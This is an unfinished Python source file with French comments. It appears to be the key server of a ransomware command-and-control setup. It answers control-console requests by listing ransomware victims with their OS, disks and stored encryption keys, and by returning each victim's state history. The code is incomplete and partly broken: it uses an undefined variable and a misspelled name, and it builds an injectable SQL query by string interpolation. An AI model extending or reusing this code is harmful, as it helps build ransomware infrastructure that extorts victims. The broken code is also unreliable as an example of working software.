import utile.network as net
import utile.message as message
import utile.data as data
"""


WIP 
A CONTINUER


"""
#socket = net.start_net_serv_client(adresse="192.168.144.9", port=8350)

while True:
    #recv_data = net.receive_message(socket)
    #message_type = message.get_message_type(recv_data)
    message_type='HIST_REQ'
    if message_type == 'LIST_VICTIM_REQ':
        """
        Le message list_victim_req est envoyé par la console de contrôleau serveur de clés pour lui demander de 
        lister les victimes du ransomware en base de données. 
        
        Les réponses list_victim_resp sont  les réponses envoyées du serveur  de  clés pour  chaque  victime enregistrée
        L'identifiant d'une victimeest son id en  base de données(pour rappel, lors de la phase d'initialisation 
        un hash SHA256 est envoyé), state est le dernier état enregistré pour la victime, nb_files est le nombre 
        de fichiers chiffrés ou déchiffrés selon le dernier état enregistré.
        
        La réponse list_victim_end est la réponse envoyée pour clôturer l'envoi du listagedes victimes. 
        """
        conn, cursor = data.connect_to_DB()
        query = "SELECT v.id_victim, v.os, v.hash, v.disks, v.key, s.id_state  FROM victims v JOIN states s ON v.id_victim = s.id_victim"
        result = data.execute_query(conn, cursor, query)

        data.disconnect_from_DB(conn)
        for victim in result:
            list_victim_resp = message.set_message("LIST_VICTIM_RESP", victim)
            net.send_message(socket, list_victim_resp)

        net.send_message(socket, message.set_message("LIST_VICTIM_END"),adresse="192.168.144.9", port=8350)




    elif message_type == 'HIST_REQ':
        """
        Le  message history_req est  envoyé  par  la console de  contrôle au serveur  de clés pour  lui  demander 
        l'historique des changements d'état d'une victime du ransomware. 
        
        Les  réponses history_resp sont  les  réponses  envoyées  pour  chaque  changement  d'état  enregistré pour cet 
        identifiant de victime.
        
        La  réponse history_end est  la  réponse  envoyée  pour  clôturer  l'envoi  de  l'historique  pour  la  victime 
        demandée.
        """
        id_victim = recv_data['HIST_REQ']
        conn, cursor = data.connect_to_DB()
        query = f"SELECT id_state, id_victim, datetime, states FROM states WHERE id_victim={id_victim}"
        result = data.execute_query(conn, cursor, query)

        data.disconnect_from_DB(conn)

        history_resp = message.set_message('HISTORY_RESP', result)
        net.send_message(socket, history_respp)
        net.send_message(socket, message.set_message('HISTORY_END'), adresse="192.168.144.9", port=8350)

    elif message_type == 'CHGSTATE':
        """
        Le message change_state est envoyé de la console de contrôlevers leserveur de clés.
        """
        pass
